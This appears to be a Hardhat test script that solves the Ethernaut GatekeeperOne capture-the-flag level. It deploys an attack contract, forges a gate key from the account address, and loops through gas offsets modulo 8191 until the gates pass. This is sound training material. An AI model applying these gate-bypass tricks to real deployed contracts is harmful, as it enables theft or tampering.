const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { keccak256 } = require("ethers/lib/utils");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  {
    inputs: [{ internalType: "bytes8", name: "_gateKey", type: "bytes8" }],
    name: "enter",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x3370204e",
  },
  {
    inputs: [],
    name: "entrant",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x9db31d77",
  },
];

const contractLevel = "0x46f79002907a025599f355A04A512A6Fd45E671B";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(
    contractLevel,
    0,
    "GatekeeperOneFactory"
  );
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  console.log(`eoa: ${JSON.stringify(eoa)}`);
  let attackFactory = await ethers.getContractFactory("GatekeeperOneAttack");
  let attackContract = await attackFactory.deploy(
    eoa.address,
    challenge.address
  );
  await attackContract.deployed();
  // Get the last 16 bits (4 hex chars) of the eoa for the gateKey
  const uint16TxOrigin = eoa.address.slice(-4);
  const gateKey = `0x100000000000${uint16TxOrigin}`;

  const MOD = 8191;
  const gasToUse = 800000;
  for (let i = 0; i < MOD; i++) {
    console.log(`i value: ${JSON.stringify(i)}`);
    try {
      await attackContract.attack(gateKey, gasToUse + i, { gasLimit: 950000 });
      break;
    } catch {}
  }
});

// after(async () => {
//   expect(await submitLevel(challenge.address), "level not solved").to.be.true;
// });
